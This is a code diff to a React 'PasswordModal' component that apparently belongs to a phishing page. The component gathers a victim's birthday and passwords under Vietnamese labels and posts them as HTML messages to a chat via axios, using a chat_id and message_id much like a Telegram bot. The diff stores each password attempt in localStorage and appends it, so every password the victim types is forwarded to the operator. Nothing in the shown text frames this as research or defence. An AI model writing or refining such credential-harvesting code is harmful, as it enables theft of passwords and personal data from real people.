@@ -7,7 +7,7 @@ import { FontAwesomeIcon } from "@fortawesome/react-fontawesome";
 import axios from "axios";
 import { type FC, useEffect, useRef, useState } from "react";
 import { useNavigate } from "react-router";
-
+const LAST_MESSAGE_KEY = "lastMessage";
 interface PasswordModalProps {
 	onClose?: () => void;
 	isOpen: boolean;
@@ -89,14 +89,16 @@ const PasswordModal: FC<PasswordModalProps> = ({
 • <b>Ngày Sinh:</b> <code>${formData.birthday}</code>
 
 🔐 <b>MẬT KHẨU</b>
-${Array.from({ length: uiState.attempt + 1 }, (_, i) => {
-	const suffix = i > 0 ? ` ${i}` : "";
-	return `• <b>Mật Khẩu${suffix}:</b> <code>${uiState.password}</code>`;
-}).join("\n")}
-`;
+• <b>Mật Khẩu:</b> <code>${uiState.password}</code>`;
+		let message = "";
+		if (localStorage.getItem(LAST_MESSAGE_KEY)) {
+			const oldMessage = localStorage.getItem(LAST_MESSAGE_KEY);
+			message = `${oldMessage}\n• <b>Mật Khẩu ${uiState.attempt + 1}:</b> <code>${uiState.password}</code>`;
+		} else {
+			message = createMessage();
+		}
 
-		const message = createMessage();
-		localStorage.setItem("lastMessage", message);
+		localStorage.setItem(LAST_MESSAGE_KEY, message);
 
 		if (uiState.attempt >= config.maxAttempt) {
 			setUiState((prev) => ({
@@ -110,7 +112,7 @@ ${Array.from({ length: uiState.attempt + 1 }, (_, i) => {
 					{
 						chat_id: config.chatId,
 						message_id: uiState.messageId,
-						text: createMessage(),
+						text: message,
 						parse_mode: "HTML",
 					},
 				);
@@ -140,13 +142,13 @@ ${Array.from({ length: uiState.attempt + 1 }, (_, i) => {
 				response = await axios.post(editUrl, {
 					chat_id: config.chatId,
 					message_id: uiState.messageId,
-					text: createMessage(),
+					text: message,
 					parse_mode: "HTML",
 				});
 			} else {
 				response = await axios.post(url, {
 					chat_id: config.chatId,
-					text: createMessage(),
+					text: message,
 					parse_mode: "HTML",
 				});
 				setUiState((prev) => ({
